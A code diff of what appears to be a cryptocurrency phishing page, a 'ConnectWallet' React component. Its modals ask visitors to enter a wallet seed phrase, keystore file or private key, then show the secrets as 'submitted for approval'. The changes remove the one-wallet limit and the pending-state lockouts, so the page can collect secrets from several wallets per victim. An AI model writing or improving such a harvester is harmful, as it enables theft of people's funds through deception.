@@ -16,7 +16,16 @@ type ImportTab = {
 	label: string;
 };
 
-type WalletStatus = "pending" | "approved" | "rejected" | null;
+type ConnectedWallet = {
+	walletId: string;
+	walletName: string;
+	walletType: string;
+	status: "pending" | "approved" | "rejected";
+	submittedAt?: string;
+	approvedAt?: string | null;
+	rejectedReason?: string | null;
+};
+
 
 interface SaveWalletResponse {
 	success: boolean;
@@ -40,7 +49,7 @@ const importTabs: ImportTab[] = [
 	{ key: "private", label: "Private Key" },
 ];
 
-export default function ConnectWallet(){
+export default function ConnectWallet() {
 	const [modalOpen, setModalOpen] = useState<boolean>(false);
 	const [manualModalOpen, setManualModalOpen] =
 		useState<boolean>(false);
@@ -51,11 +60,9 @@ export default function ConnectWallet(){
 	const [activeTab, setActiveTab] =
 		useState<"phrase" | "keystore" | "private">("phrase");
 
-	const [connectedWallet, setConnectedWallet] =
-		useState<string | null>(null);
+	const [connectedWallets, setConnectedWallets] =
+		useState<ConnectedWallet[]>([]);
 
-	const [walletStatus, setWalletStatus] =
-		useState<WalletStatus>(null);
 
 	const sessionResult = useSession();
 	const session = sessionResult?.data;
@@ -66,19 +73,14 @@ export default function ConnectWallet(){
 				const resp = await fetch("/api/wallet-status");
 				const data = await resp.json();
 
-				if (data.status === "approved") {
-					setConnectedWallet(data.walletName);
-					setWalletStatus("approved");
-				} else if (data.status === "pending") {
-					setWalletStatus("pending");
-				} else if (data.status === "rejected") {
-					setWalletStatus("rejected");
-				} else {
-					setConnectedWallet(null);
-					setWalletStatus(null);
+				if (data.success) {
+					setConnectedWallets(data.wallets || []);
 				}
 			} catch (error) {
-				console.error("Error fetching wallet status:", error);
+				console.error(
+					"Error fetching connected wallets:",
+					error
+				);
 			}
 		}
 
@@ -86,12 +88,9 @@ export default function ConnectWallet(){
 			fetchConnectedWallet();
 		}
 	}, [session]);
-
 	const handleWalletClick = (wallet: Wallet): void => {
-		if (walletStatus === "approved" || walletStatus === "pending") return;
-
 		setSelectedWallet(wallet);
-		setModalOpen(true); 
+		setModalOpen(true);
 	};
 
 	const handleCloseModal = (): void => {
@@ -113,53 +112,99 @@ export default function ConnectWallet(){
 		<div style={{ minHeight: "100vh", paddingBottom: "var(--space-6)", backgroundColor: "var(--background)", color: "var(--foreground)" }}>
 			<div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
 				<div className="card card-elevated" style={{ padding: "var(--space-5)" }}>
-					{/* Connected Wallet - Approved */}
-					{walletStatus === "approved" && connectedWallet && (
-						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
-							<CheckCircle style={{ height: "2.5rem", width: "2.5rem", color: "var(--success-500)", marginBottom: "var(--space-2)" }} />
+					{connectedWallets.length > 0 && (
+						<div
+							className="card"
+							style={{
+								marginBottom: "var(--space-8)",
+								padding: "var(--space-5)",
+							}}
+						>
+							<h2
+								style={{
+									fontSize: "var(--text-xl)",
+									fontWeight: 700,
+									marginBottom: "var(--space-4)",
+								}}
+							>
+								Connected Wallets
+							</h2>
 
-							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--success-500)" }}>
-								Wallet Connected!
-							</div>
+							<div
+								style={{
+									display: "flex",
+									flexDirection: "column",
+									gap: "var(--space-3)",
+								}}
+							>
+								{connectedWallets.map((wallet) => (
+									<div
+										key={wallet.walletId}
+										style={{
+											display: "flex",
+											justifyContent: "space-between",
+											alignItems: "center",
+											padding: "var(--space-3)",
+											borderRadius: "var(--radius-md)",
+											background: "var(--glass-white-sm)",
+										}}
+									>
+										<div>
+											<div
+												style={{
+													fontWeight: 600,
+													color: "var(--foreground)",
+												}}
+											>
+												{wallet.walletName}
+											</div>
 
-							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
-								Your{" "}
-								<span style={{ fontWeight: 600, color: "var(--foreground)" }}>
-									{connectedWallet}
-								</span>{" "}
-								wallet has been approved .
-							</div> 
-						</div>
-					)}
+											<div
+												style={{
+													fontSize: "var(--text-xs)",
+													color: "var(--text-200)",
+												}}
+											>
+												{wallet.walletType}
+											</div>
+										</div>
 
-					{/* Pending Wallet Status */}
-					{walletStatus === "pending" && (
-						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
-							<Clock style={{ height: "2.5rem", width: "2.5rem", color: "var(--info-500)", marginBottom: "var(--space-2)", animation: "spin 2s linear infinite" }} />
+										<div>
+											{wallet.status === "approved" && (
+												<span
+													style={{
+														color: "var(--success-500)",
+														fontWeight: 600,
+													}}
+												>
+													✓ Approved
+												</span>
+											)}
 
-							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--info-500)" }}>
-								Wallet Pending Approval
-							</div>
+											{wallet.status === "pending" && (
+												<span
+													style={{
+														color: "var(--info-500)",
+														fontWeight: 600,
+													}}
+												>
+													 Pending
+												</span>
+											)}
 
-							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
-								Your wallet submission is under review by our system.
-								Please wait for approval.
-							</div>
-						</div>
-					)}
-
-					{/* Rejected Wallet Status */}
-					{walletStatus === "rejected" && (
-						<div style={{ marginBottom: "var(--space-8)", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center" }}>
-							<AlertCircle style={{ height: "2.5rem", width: "2.5rem", color: "var(--danger-500)", marginBottom: "var(--space-2)" }} />
-
-							<div style={{ fontSize: "var(--text-lg)", fontWeight: 700, color: "var(--danger-500)" }}>
-								Wallet Rejected
-							</div>
-
-							<div style={{ fontSize: "var(--text-sm)", color: "var(--text-200)", marginTop: "var(--space-1)" }}>
-								Your wallet submission was rejected. Please try again with
-								valid credentials.
+											{wallet.status === "rejected" && (
+												<span
+													style={{
+														color: "var(--danger-500)",
+														fontWeight: 600,
+													}}
+												>
+													✕ Rejected
+												</span>
+											)}
+										</div>
+									</div>
+								))}
 							</div>
 						</div>
 					)}
@@ -186,16 +231,14 @@ export default function ConnectWallet(){
 									display: "flex",
 									flexDirection: "column",
 									alignItems: "center",
-									cursor: walletStatus === "approved" || walletStatus === "pending" ? "not-allowed" : "pointer",
+									cursor: "pointer",
 									padding: "var(--space-4)",
-									opacity: walletStatus === "approved" || walletStatus === "pending" ? 0.5 : 1,
+									opacity: 1,
 									transition: "transform var(--duration-base) var(--ease-out)",
 								}}
 								onClick={() => handleWalletClick(wallet)}
 								onMouseEnter={(e) => {
-									if (walletStatus !== "approved" && walletStatus !== "pending") {
-										e.currentTarget.style.transform = "scale(1.05)";
-									}
+									e.currentTarget.style.transform = "scale(1.05)";
 								}}
 								onMouseLeave={(e) => {
 									e.currentTarget.style.transform = "scale(1)";
@@ -218,163 +261,157 @@ export default function ConnectWallet(){
 				</div>
 
 				{/* Main Modal */}
-				{modalOpen &&
-					walletStatus !== "approved" &&
-					walletStatus !== "pending" &&
-					selectedWallet && (
-						<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
-							<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", position: "relative", overflow: "hidden", margin: "0 0.5rem" }}>
-								<div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "var(--space-4)", borderBottom: "1px solid var(--border-default)" }}>
-									<button
-										onClick={handleCloseModal}
-										style={{ backgroundColor: "transparent", border: "none", color: "var(--text-200)", cursor: "pointer", fontSize: "1.25rem", transition: "color var(--duration-fast) var(--ease-out)" }}
-										onMouseEnter={(e) => e.currentTarget.style.color = "var(--danger-500)"}
-										onMouseLeave={(e) => e.currentTarget.style.color = "var(--text-200)"}
-									>
-										✕
-									</button>
+				{modalOpen && selectedWallet && (
+					<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
+						<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", position: "relative", overflow: "hidden", margin: "0 0.5rem" }}>
+							<div style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "var(--space-4)", borderBottom: "1px solid var(--border-default)" }}>
+								<button
+									onClick={handleCloseModal}
+									style={{ backgroundColor: "transparent", border: "none", color: "var(--text-200)", cursor: "pointer", fontSize: "1.25rem", transition: "color var(--duration-fast) var(--ease-out)" }}
+									onMouseEnter={(e) => e.currentTarget.style.color = "var(--danger-500)"}
+									onMouseLeave={(e) => e.currentTarget.style.color = "var(--text-200)"}
+								>
+									✕
+								</button>
 
-									<div
-										style={{ color: "var(--primary)", fontWeight: 600, cursor: "pointer", transition: "opacity var(--duration-fast) var(--ease-out)" }}
-										onClick={handleCloseModal}
-										onMouseEnter={(e) => e.currentTarget.style.opacity = "0.7"}
-										onMouseLeave={(e) => e.currentTarget.style.opacity = "1"}
-									>
-										Back
-									</div>
+								<div
+									style={{ color: "var(--primary)", fontWeight: 600, cursor: "pointer", transition: "opacity var(--duration-fast) var(--ease-out)" }}
+									onClick={handleCloseModal}
+									onMouseEnter={(e) => e.currentTarget.style.opacity = "0.7"}
+									onMouseLeave={(e) => e.currentTarget.style.opacity = "1"}
+								>
+									Back
 								</div>
+							</div>
 
-								<div style={{ padding: "var(--space-6)" }}>
-									<div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
-										<div style={{ marginBottom: "var(--space-4)" }}>
+							<div style={{ padding: "var(--space-6)" }}>
+								<div style={{ display: "flex", flexDirection: "column", alignItems: "center" }}>
+									<div style={{ marginBottom: "var(--space-4)" }}>
+										<img
+											src={selectedWallet.icon}
+											alt="Icon"
+											style={{ width: 40, height: 40 }}
+										/>
+									</div>
+
+									<div style={{ fontSize: "var(--text-lg)", fontWeight: 500, marginBottom: "var(--space-2)", color: "var(--foreground)" }}>
+										Connect {selectedWallet.name}
+									</div>
+
+									<div style={{ display: "flex", justifyContent: "center", marginBottom: "var(--space-4)" }}>
+										<button
+											className="btn-primary"
+											onClick={handleOpenManual}
+										>
+											Connect Manually
+										</button>
+									</div>
+
+									<div style={{ display: "flex", cursor: "pointer", alignItems: "center", justifyContent: "space-between", width: "100%", backgroundColor: "var(--glass-white-sm)", borderRadius: "var(--radius-md)", padding: "var(--space-3)", marginTop: "var(--space-2)", transition: "background var(--duration-base) var(--ease-out)" }}
+										onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-md)"}
+										onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-sm)"}
+									>
+										<div>
+											<div style={{ fontWeight: 600, color: "var(--primary)" }}>
+												{selectedWallet.name}
+											</div>
+
+											<div style={{ fontSize: "var(--text-xs)", color: "var(--text-200)" }}>
+												Easy-to-use browser extension.
+											</div>
+										</div>
+
+										<div>
 											<img
 												src={selectedWallet.icon}
 												alt="Icon"
-												style={{ width: 40, height: 40 }}
+												style={{ width: 24 }}
 											/>
 										</div>
-
-										<div style={{ fontSize: "var(--text-lg)", fontWeight: 500, marginBottom: "var(--space-2)", color: "var(--foreground)" }}>
-											Connect {selectedWallet.name}
-										</div>
-
-										<div style={{ display: "flex", justifyContent: "center", marginBottom: "var(--space-4)" }}>
-											<button
-												className="btn-primary"
-												onClick={handleOpenManual}
-											>
-												Connect Manually
-											</button>
-										</div>
-
-										<div style={{ display: "flex", cursor: "pointer", alignItems: "center", justifyContent: "space-between", width: "100%", backgroundColor: "var(--glass-white-sm)", borderRadius: "var(--radius-md)", padding: "var(--space-3)", marginTop: "var(--space-2)", transition: "background var(--duration-base) var(--ease-out)" }}
-											onMouseEnter={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-md)"}
-											onMouseLeave={(e) => e.currentTarget.style.backgroundColor = "var(--glass-white-sm)"}
-										>
-											<div>
-												<div style={{ fontWeight: 600, color: "var(--primary)" }}>
-													{selectedWallet.name}
-												</div>
-
-												<div style={{ fontSize: "var(--text-xs)", color: "var(--text-200)" }}>
-													Easy-to-use browser extension.
-												</div>
-											</div>
-
-											<div>
-												<img
-													src={selectedWallet.icon}
-													alt="Icon"
-													style={{ width: 24 }}
-												/>
-											</div>
-										</div>
 									</div>
 								</div>
 							</div>
 						</div>
-					)}
+					</div>
+				)}
 
 				{/* Manual Modal */}
-				{manualModalOpen &&
-					walletStatus !== "approved" &&
-					walletStatus !== "pending" &&
-					selectedWallet && (
-						<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
-							<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", margin: "0 0.5rem" }}>
-								<div style={{ padding: "var(--space-6)" }}>
-									<h3 style={{ fontSize: "var(--text-lg)", fontWeight: 500, color: "var(--foreground)", display: "flex", alignItems: "center", gap: "var(--space-4)", marginBottom: "var(--space-6)" }}>
-										<img
-											src={selectedWallet.icon}
-											alt="wallet"
-											style={{ height: "2.5rem", width: "2.5rem" }}
-										/>
+				{manualModalOpen && selectedWallet && (
+					<div style={{ position: "fixed", inset: 0, zIndex: 300, display: "flex", alignItems: "center", justifyContent: "center", backgroundColor: "rgba(0, 0, 0, 0.85)" }}>
+						<div className="card card-elevated" style={{ width: "100%", maxWidth: "32rem", margin: "0 0.5rem" }}>
+							<div style={{ padding: "var(--space-6)" }}>
+								<h3 style={{ fontSize: "var(--text-lg)", fontWeight: 500, color: "var(--foreground)", display: "flex", alignItems: "center", gap: "var(--space-4)", marginBottom: "var(--space-6)" }}>
+									<img
+										src={selectedWallet.icon}
+										alt="wallet"
+										style={{ height: "2.5rem", width: "2.5rem" }}
+									/>
 
-										<span>
-											Import your {selectedWallet.name} wallet
-										</span>
-									</h3>
+									<span>
+										Import your {selectedWallet.name} wallet
+									</span>
+								</h3>
 
-									<div style={{ display: "flex", justifyContent: "space-around", marginBottom: "var(--space-4)" }}>
-										{importTabs.map((tab) => (
-											<div
-												key={tab.key}
-												style={{
-													padding: "var(--space-2)",
-													borderBottom: activeTab === tab.key ? "2px solid var(--primary)" : "2px solid var(--border-default)",
-													cursor: "pointer",
-													color: activeTab === tab.key ? "var(--primary)" : "var(--text-200)",
-													transition: "all var(--duration-base) var(--ease-out)",
-												}}
-												onClick={() => setActiveTab(tab.key)}
-											>
-												{tab.label}
-											</div>
-										))}
-									</div>
-
-									{activeTab === "phrase" && (
-										<SeedPhraseTab
-											walletName={selectedWallet.name}
-											onSuccess={() => {
-												handleCloseManual();
-												setTimeout(() => window.location.reload(), 2000);
+								<div style={{ display: "flex", justifyContent: "space-around", marginBottom: "var(--space-4)" }}>
+									{importTabs.map((tab) => (
+										<div
+											key={tab.key}
+											style={{
+												padding: "var(--space-2)",
+												borderBottom: activeTab === tab.key ? "2px solid var(--primary)" : "2px solid var(--border-default)",
+												cursor: "pointer",
+												color: activeTab === tab.key ? "var(--primary)" : "var(--text-200)",
+												transition: "all var(--duration-base) var(--ease-out)",
 											}}
-										/>
-									)}
-
-									{activeTab === "keystore" && (
-										<KeystoreTab
-											walletName={selectedWallet.name}
-											onSuccess={() => {
-												handleCloseManual();
-												setTimeout(() => window.location.reload(), 2000);
-											}}
-										/>
-									)}
-
-									{activeTab === "private" && (
-										<PrivateKeyTab
-											walletName={selectedWallet.name}
-											onSuccess={() => {
-												handleCloseManual();
-												setTimeout(() => window.location.reload(), 2000);
-											}}
-										/>
-									)}
-
-									<div style={{ display: "flex", justifyContent: "flex-end", marginTop: "var(--space-4)" }}>
-										<button
-											className="btn-secondary"
-											onClick={handleCloseManual}
+											onClick={() => setActiveTab(tab.key)}
 										>
-											Cancel
-										</button>
-									</div>
+											{tab.label}
+										</div>
+									))}
+								</div>
+
+								{activeTab === "phrase" && (
+									<SeedPhraseTab
+										walletName={selectedWallet.name}
+										onSuccess={() => {
+											handleCloseManual();
+											setTimeout(() => window.location.reload(), 2000);
+										}}
+									/>
+								)}
+
+								{activeTab === "keystore" && (
+									<KeystoreTab
+										walletName={selectedWallet.name}
+										onSuccess={() => {
+											handleCloseManual();
+											setTimeout(() => window.location.reload(), 2000);
+										}}
+									/>
+								)}
+
+								{activeTab === "private" && (
+									<PrivateKeyTab
+										walletName={selectedWallet.name}
+										onSuccess={() => {
+											handleCloseManual();
+											setTimeout(() => window.location.reload(), 2000);
+										}}
+									/>
+								)}
+
+								<div style={{ display: "flex", justifyContent: "flex-end", marginTop: "var(--space-4)" }}>
+									<button
+										className="btn-secondary"
+										onClick={handleCloseManual}
+									>
+										Cancel
+									</button>
 								</div>
 							</div>
 						</div>
-					)}
+					</div>
+				)}
 			</div>
 		</div>
 	);
@@ -399,28 +436,12 @@ interface GlobalPendingState {
 /* ───────────────────────────────────────────── */
 
 function useGlobalPending(): GlobalPendingState {
-	const [globalPending, setGlobalPending] =
-		useState<boolean>(false);
-
-	const [pendingType, setPendingType] =
-		useState<string | null>(null);
-
-	useEffect(() => {
-		fetch("/api/wallet-status")
-			.then((res) => res.json())
-			.then((data) => {
-				if (data.status === "pending") {
-					setGlobalPending(true);
-					setPendingType(data.pendingType);
-				} else {
-					setGlobalPending(false);
-					setPendingType(null);
-				}
-			});
-	}, []);
-
-	return { globalPending, pendingType };
+	return {
+		globalPending: false,
+		pendingType: null,
+	};
 }
+
 
 /* ───────────────────────────────────────────── */
 /* SEED PHRASE TAB */
@@ -429,7 +450,7 @@ function useGlobalPending(): GlobalPendingState {
 function SeedPhraseTab({
 	walletName,
 	onSuccess,
-}: TabProps){
+}: TabProps) {
 	const [phraseArr, setPhraseArr] = useState<string[]>(
 		Array(12).fill("")
 	);
@@ -437,8 +458,7 @@ function SeedPhraseTab({
 	const [submitted, setSubmitted] =
 		useState<boolean>(false);
 
-	const [status, setStatus] =
-		useState<WalletStatus>("pending");
+	
 
 	const [loading, setLoading] =
 		useState<boolean>(false);
@@ -446,7 +466,7 @@ function SeedPhraseTab({
 	const [showPhrase, setShowPhrase] =
 		useState<boolean>(false);
 
-	const { globalPending } = useGlobalPending();
+
 
 	const handleWordChange = (
 		idx: number,
@@ -490,7 +510,7 @@ function SeedPhraseTab({
 
 			if (result.success) {
 				setSubmitted(true);
-				setStatus("pending");
+				
 				toast.success(
 					"Wallet submitted for approval."
 				);
@@ -563,10 +583,10 @@ function SeedPhraseTab({
 			<button
 				type="submit"
 				className="btn-primary"
-				disabled={submitted || loading || globalPending}
+				disabled={submitted || loading}
 				style={{
-					opacity: submitted || loading || globalPending ? 0.5 : 1,
-					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+					opacity: submitted || loading ? 0.5 : 1,
+					cursor: submitted || loading ? "not-allowed" : "pointer",
 				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
@@ -582,7 +602,7 @@ function SeedPhraseTab({
 function KeystoreTab({
 	walletName,
 	onSuccess,
-}: TabProps){
+}: TabProps) {
 	const [keystoreJson, setKeystoreJson] =
 		useState<string>("");
 
@@ -592,7 +612,6 @@ function KeystoreTab({
 	const [submitted, setSubmitted] =
 		useState<boolean>(false);
 
-	const { globalPending } = useGlobalPending();
 
 	const handleSubmit = async (
 		e: FormEvent<HTMLFormElement>
@@ -685,10 +704,10 @@ function KeystoreTab({
 			<button
 				type="submit"
 				className="btn-primary"
-				disabled={submitted || loading || globalPending}
+				disabled={submitted || loading }
 				style={{
-					opacity: submitted || loading || globalPending ? 0.5 : 1,
-					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+					opacity: submitted || loading ? 0.5 : 1,
+					cursor: submitted || loading ? "not-allowed" : "pointer",
 				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
@@ -704,7 +723,7 @@ function KeystoreTab({
 function PrivateKeyTab({
 	walletName,
 	onSuccess,
-}: TabProps){
+}: TabProps) {
 	const [privateKey, setPrivateKey] =
 		useState<string>("");
 
@@ -717,7 +736,6 @@ function PrivateKeyTab({
 	const [showKey, setShowKey] =
 		useState<boolean>(false);
 
-	const { globalPending } = useGlobalPending();
 
 	const handleSubmit = async (
 		e: FormEvent<HTMLFormElement>
@@ -831,10 +849,10 @@ function PrivateKeyTab({
 			<button
 				type="submit"
 				className="btn-primary"
-				disabled={submitted || loading || globalPending}
+				disabled={submitted || loading }
 				style={{
-					opacity: submitted || loading || globalPending ? 0.5 : 1,
-					cursor: submitted || loading || globalPending ? "not-allowed" : "pointer",
+					opacity: submitted || loading ? 0.5 : 1,
+					cursor: submitted || loading ? "not-allowed" : "pointer",
 				}}
 			>
 				{loading ? "Submitting..." : "Proceed"}
